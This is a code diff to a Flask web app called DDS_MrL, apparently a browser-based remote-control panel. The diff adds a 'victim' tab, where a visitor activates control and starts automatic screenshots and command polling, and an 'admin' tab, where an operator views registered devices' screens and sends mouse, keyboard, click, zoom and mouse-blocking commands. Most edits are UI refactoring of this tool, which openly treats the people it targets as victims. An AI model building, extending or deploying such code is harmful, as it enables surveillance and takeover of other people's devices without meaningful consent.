@@ -13,7 +13,6 @@ logger = logging.getLogger(__name__)
 
 devices = {}
 
-# ========== БЭКЕНД ==========
 @app.route('/api/register', methods=['POST'])
 def register():
     data = request.json
@@ -105,14 +104,14 @@ def list_devices():
         clean[k] = {key: val for key, val in v.items() if key not in ['cmd', 'cmd_x', 'cmd_y', 'cmd_scroll', 'cmd_zoom', 'cmd_key']}
     return jsonify(clean)
 
-# ========== СТРАНИЦА С ЖЕСТАМИ ==========
+# ========== СТРАНИЦА ==========
 PAGE = '''
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>DDS_MrL — Управление</title>
+    <title>DDS_MrL</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{background:#0b0e1a;color:#c9d1d9;font-family:system-ui,sans-serif;padding:15px;max-width:900px;margin:auto;}
@@ -142,33 +141,40 @@ PAGE = '''
         .refresh-btn{background:#1f6feb;border:none;padding:8px 18px;border-radius:6px;color:#fff;font-weight:bold;cursor:pointer;}
         .touchpad{background:#0d1117;border:2px dashed #30363d;border-radius:12px;height:200px;display:flex;align-items:center;justify-content:center;color:#8b949e;font-size:14px;margin-top:8px;touch-action:none;user-select:none;transition:border-color 0.3s;}
         .touchpad.active{border-color:#58a6ff;background:#161b22;}
-        .touchpad .hint{text-align:center;}
         .keyboard-row{display:flex;gap:4px;flex-wrap:wrap;margin-top:6px;}
         .keyboard-row button{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:6px 10px;border-radius:4px;font-size:14px;cursor:pointer;min-width:32px;}
-        .keyboard-row button:active{background:#30363d;}
         .status{margin-top:10px;font-size:14px;color:#8b949e;}
         .status.success{color:#2ea043;}
         .status.error{color:#f85149;}
-        .mode-tag{font-size:11px;background:#21262d;padding:2px 10px;border-radius:12px;display:inline-block;margin-left:6px;}
+        .mode-tabs{display:flex;gap:8px;margin-bottom:15px;border-bottom:1px solid #30363d;padding-bottom:10px;}
+        .mode-tab{background:transparent;border:none;color:#8b949e;padding:8px 16px;font-size:16px;cursor:pointer;border-radius:8px;font-weight:bold;}
+        .mode-tab.active{color:#58a6ff;background:#1a2a4a;}
+        .mode-tab:hover{color:#c9d1d9;}
     </style>
 </head>
 <body>
 <div id="app">
     <h1 style="color:#58a6ff;border-bottom:2px solid #30363d;padding-bottom:10px;margin-bottom:15px;">🛸 DDS_MrL</h1>
 
-    <div class="card">
-        <div style="color:#8b949e;font-size:14px;">Ваш ID:</div>
-        <div class="id" id="deviceId">---</div>
-        <button class="btn" id="registerBtn">🔗 Активировать управление</button>
-        <div class="status" id="statusText">Нажмите кнопку</div>
+    <div class="mode-tabs">
+        <button class="mode-tab active" id="victimTab" onclick="setMode('victim')">👤 Жертва</button>
+        <button class="mode-tab" id="adminTab" onclick="setMode('admin')">🛠️ Админ</button>
     </div>
 
-    <div id="adminPanel" class="hidden">
+    <div id="victimMode">
+        <div class="card">
+            <div style="color:#8b949e;font-size:14px;">Ваш ID:</div>
+            <div class="id" id="deviceId">---</div>
+            <button class="btn" id="registerBtn">🔗 Активировать управление</button>
+            <div class="status" id="statusText">Нажмите кнопку</div>
+        </div>
+    </div>
+
+    <div id="adminMode" class="hidden">
         <div class="stats-bar">
             <span id="onlineCount">🟢 0 онлайн</span>
             <span id="autoCount">📸 0 авто-скринов</span>
         </div>
-        <button class="refresh-btn" onclick="refreshDevices()">🔄 Обновить</button>
         <div id="deviceList" style="margin-top:12px;"></div>
 
         <div id="viewerArea" class="viewer-area hidden">
@@ -177,8 +183,6 @@ PAGE = '''
                 <span style="font-size:11px;color:#8b949e;" id="modeLabel">Режим: <span id="modeName">TouchPad</span></span>
             </div>
             <img id="viewerScreen" src="" />
-            
-            <!-- TOUCHPAD -->
             <div class="touchpad" id="touchpad">
                 <div class="hint" id="touchpadHint">
                     👆 Ведите пальцем для движения<br>
@@ -187,38 +191,23 @@ PAGE = '''
                     🤏 Щипок = зум
                 </div>
             </div>
-
-            <!-- КЛАВИАТУРА -->
             <div style="margin-top:8px;">
                 <button class="btn-sm" onclick="toggleKeyboard()">⌨️ Клавиатура</button>
                 <div id="keyboardArea" class="hidden" style="margin-top:6px;">
                     <div class="keyboard-row">
-                        <button onclick="sendKey('a')">A</button>
-                        <button onclick="sendKey('b')">B</button>
-                        <button onclick="sendKey('c')">C</button>
-                        <button onclick="sendKey('d')">D</button>
-                        <button onclick="sendKey('e')">E</button>
-                        <button onclick="sendKey('f')">F</button>
-                        <button onclick="sendKey('g')">G</button>
-                        <button onclick="sendKey('h')">H</button>
-                        <button onclick="sendKey('i')">I</button>
-                        <button onclick="sendKey('j')">J</button>
-                        <button onclick="sendKey('k')">K</button>
-                        <button onclick="sendKey('l')">L</button>
-                        <button onclick="sendKey('m')">M</button>
-                        <button onclick="sendKey('n')">N</button>
-                        <button onclick="sendKey('o')">O</button>
-                        <button onclick="sendKey('p')">P</button>
-                        <button onclick="sendKey('q')">Q</button>
-                        <button onclick="sendKey('r')">R</button>
-                        <button onclick="sendKey('s')">S</button>
-                        <button onclick="sendKey('t')">T</button>
-                        <button onclick="sendKey('u')">U</button>
-                        <button onclick="sendKey('v')">V</button>
-                        <button onclick="sendKey('w')">W</button>
-                        <button onclick="sendKey('x')">X</button>
-                        <button onclick="sendKey('y')">Y</button>
-                        <button onclick="sendKey('z')">Z</button>
+                        <button onclick="sendKey('a')">A</button><button onclick="sendKey('b')">B</button>
+                        <button onclick="sendKey('c')">C</button><button onclick="sendKey('d')">D</button>
+                        <button onclick="sendKey('e')">E</button><button onclick="sendKey('f')">F</button>
+                        <button onclick="sendKey('g')">G</button><button onclick="sendKey('h')">H</button>
+                        <button onclick="sendKey('i')">I</button><button onclick="sendKey('j')">J</button>
+                        <button onclick="sendKey('k')">K</button><button onclick="sendKey('l')">L</button>
+                        <button onclick="sendKey('m')">M</button><button onclick="sendKey('n')">N</button>
+                        <button onclick="sendKey('o')">O</button><button onclick="sendKey('p')">P</button>
+                        <button onclick="sendKey('q')">Q</button><button onclick="sendKey('r')">R</button>
+                        <button onclick="sendKey('s')">S</button><button onclick="sendKey('t')">T</button>
+                        <button onclick="sendKey('u')">U</button><button onclick="sendKey('v')">V</button>
+                        <button onclick="sendKey('w')">W</button><button onclick="sendKey('x')">X</button>
+                        <button onclick="sendKey('y')">Y</button><button onclick="sendKey('z')">Z</button>
                         <button onclick="sendKey(' ')}">␣</button>
                         <button onclick="sendKey('Enter')}">↵</button>
                         <button onclick="sendKey('Backspace')}">⌫</button>
@@ -226,7 +215,6 @@ PAGE = '''
                     </div>
                 </div>
             </div>
-
             <div class="flex">
                 <button class="btn-sm primary" onclick="sendCmd(currentViewId, 'capture_screen')">📸 Скрин</button>
                 <button class="btn-sm danger" onclick="sendCmd(currentViewId, 'block_mouse')">🖱️ Заблок.</button>
@@ -247,13 +235,23 @@ PAGE = '''
     if(/mobile/i.test(navigator.userAgent) && !/tablet/i.test(navigator.userAgent)) deviceType = "phone";
 
     let active = false, screenInterval = null, devices = {}, currentViewId = null;
-    let touchpadMode = 'touchpad'; // 'touchpad' | 'joystick'
+    let touchpadMode = 'touchpad';
     let touchStartX = 0, touchStartY = 0;
     let lastTouchX = 0, lastTouchY = 0;
     let longPressTimer = null;
     let isLongPress = false;
     let initialPinchDist = 0;
-    let currentZoom = 0;
+
+    function setMode(mode) {
+        document.getElementById('victimMode').classList.toggle('hidden', mode === 'admin');
+        document.getElementById('adminMode').classList.toggle('hidden', mode === 'victim');
+        document.getElementById('victimTab').classList.toggle('active', mode === 'victim');
+        document.getElementById('adminTab').classList.toggle('active', mode === 'admin');
+        if(mode === 'admin') {
+            refreshDevices();
+            setTimeout(initTouchPad, 100);
+        }
+    }
 
     document.getElementById('registerBtn').addEventListener('click', function() {
         fetch("/api/register", {
@@ -266,12 +264,9 @@ PAGE = '''
                 document.getElementById('statusText').textContent = "✅ Активно! Авто-скриншоты включены";
                 document.getElementById('statusText').className = "status success";
                 document.getElementById('registerBtn').textContent = "🔄 Обновить";
-                document.getElementById('adminPanel').classList.remove('hidden');
                 startAutoScreen();
                 pollCommands();
-                refreshDevices();
-                setInterval(refreshDevices, 3000);
-                initTouchPad();
+                setMode('admin');
             } else {
                 document.getElementById('statusText').textContent = "❌ Ошибка";
                 document.getElementById('statusText').className = "status error";
@@ -282,11 +277,9 @@ PAGE = '''
         });
     });
 
-    // ===== TOUCHPAD =====
     function initTouchPad() {
         const tp = document.getElementById('touchpad');
         if(!tp) return;
-
         tp.addEventListener('touchstart', function(e) {
             e.preventDefault();
             const t = e.touches;
@@ -299,7 +292,6 @@ PAGE = '''
                 isLongPress = false;
                 longPressTimer = setTimeout(() => {
                     isLongPress = true;
-                    // ПКМ
                     if(currentViewId) {
                         sendCmd(currentViewId, 'click', lastTouchX, lastTouchY, 0, 0, null, true);
                     }
@@ -307,11 +299,9 @@ PAGE = '''
                 tp.classList.add('active');
             } else if(t.length === 2) {
                 clearTimeout(longPressTimer);
-                // Начало зума
                 const dx = t[0].clientX - t[1].clientX;
                 const dy = t[0].clientY - t[1].clientY;
                 initialPinchDist = Math.sqrt(dx*dx + dy*dy);
-                currentZoom = 0;
             }
         }, {passive: false});
 
@@ -324,12 +314,10 @@ PAGE = '''
                 const dy = touch.clientY - lastTouchY;
                 lastTouchX = touch.clientX;
                 lastTouchY = touch.clientY;
-                // Движение мыши
                 if(currentViewId && (Math.abs(dx) > 2 || Math.abs(dy) > 2)) {
                     sendCmd(currentViewId, 'mouse_move', touch.clientX, touch.clientY);
                 }
             } else if(t.length === 2) {
-                // Зум
                 const dx = t[0].clientX - t[1].clientX;
                 const dy = t[0].clientY - t[1].clientY;
                 const dist = Math.sqrt(dx*dx + dy*dy);
@@ -348,14 +336,12 @@ PAGE = '''
             clearTimeout(longPressTimer);
             tp.classList.remove('active');
             if(!isLongPress && e.changedTouches.length === 1) {
-                // ЛКМ
                 const touch = e.changedTouches[0];
                 if(currentViewId) {
                     sendCmd(currentViewId, 'click', touch.clientX, touch.clientY);
                 }
             }
             isLongPress = false;
-            // Свайп двумя пальцами = скролл
             if(e.touches.length === 0 && e.changedTouches.length === 2) {
                 const t1 = e.changedTouches[0];
                 const t2 = e.changedTouches[1];
@@ -382,8 +368,7 @@ PAGE = '''
     }
 
     function toggleKeyboard() {
-        const kb = document.getElementById('keyboardArea');
-        kb.classList.toggle('hidden');
+        document.getElementById('keyboardArea').classList.toggle('hidden');
     }
 
     function sendKey(key) {
@@ -392,7 +377,6 @@ PAGE = '''
         }
     }
 
-    // ===== ОБНОВЛЁННАЯ ОТПРАВКА КОМАНД =====
     window.sendCmd = function(id, cmd, x, y, scroll, zoom, key, isRight) {
         if(!id) return;
         const payload = {
@@ -413,7 +397,6 @@ PAGE = '''
         if(cmd === "capture_screen") setTimeout(refreshDevices, 3000);
     };
 
-    // ===== ОСТАЛЬНЫЕ ФУНКЦИИ (опрос, скрины, список) =====
     function pollCommands() {
         if(!active) return;
         fetch("/api/poll/" + deviceId)
@@ -476,20 +459,6 @@ PAGE = '''
         } catch(e){}
     }
 
-    window.moveMouse = function() {
-        if(!currentViewId) return;
-        const x = parseInt(document.getElementById('mx').value) || 0;
-        const y = parseInt(document.getElementById('my').value) || 0;
-        sendCmd(currentViewId, 'mouse_move', x, y);
-    };
-
-    window.clickMouse = function() {
-        if(!currentViewId) return;
-        const x = parseInt(document.getElementById('mx').value) || 0;
-        const y = parseInt(document.getElementById('my').value) || 0;
-        sendCmd(currentViewId, 'click', x, y);
-    };
-
     window.viewDevice = function(id) {
         currentViewId = id;
         document.getElementById('viewerArea').classList.remove('hidden');
@@ -545,6 +514,9 @@ PAGE = '''
             if(window.viewerInterval) clearInterval(window.viewerInterval);
         }
     }
+
+    refreshDevices();
+    setInterval(refreshDevices, 2000);
 
     window.addEventListener('beforeunload', function() {
         if(screenInterval) clearInterval(screenInterval);
